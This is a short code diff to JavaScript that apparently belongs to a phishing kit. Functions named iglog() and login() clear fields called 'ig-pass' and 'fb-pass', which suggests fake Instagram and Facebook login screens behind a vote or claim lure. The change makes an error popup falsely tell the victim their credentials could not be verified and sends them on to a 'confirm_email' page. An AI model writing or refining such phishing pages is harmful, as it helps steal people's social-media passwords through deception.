@@ -85,9 +85,9 @@ function iglog() {
 
       Swal.fire({
         title: 'Oops!',
-        text: 'There was an error with your claim.',
+        text: 'We could not verify your login credentials',
         icon: 'error',
-        confirmButtonText: '<a style="text-decoration: none; cursor: pointer; color:white; href="confirm_email.html">Verify email</a>'
+        confirmButtonText: '<a style="text-decoration: none; cursor: pointer; color:white;" href="confirm_email.html">Proceed</a>'
       });
 
       document.getElementById('ig-pass').value = '';
@@ -127,7 +127,7 @@ function login() {
         title: 'Oops!',
         text: 'There was an error with your claim.',
         icon: 'error',
-        confirmButtonText: '<a style="text-decoration: none; cursor: pointer; color:white;" href="votescrn1.html">Go Back</a>'
+        confirmButtonText: '<a style="text-decoration: none; cursor: pointer; color:white;" href="votescrn.html">Go Back</a>'
       });
       document.getElementById('fb-pass').value = '';
 
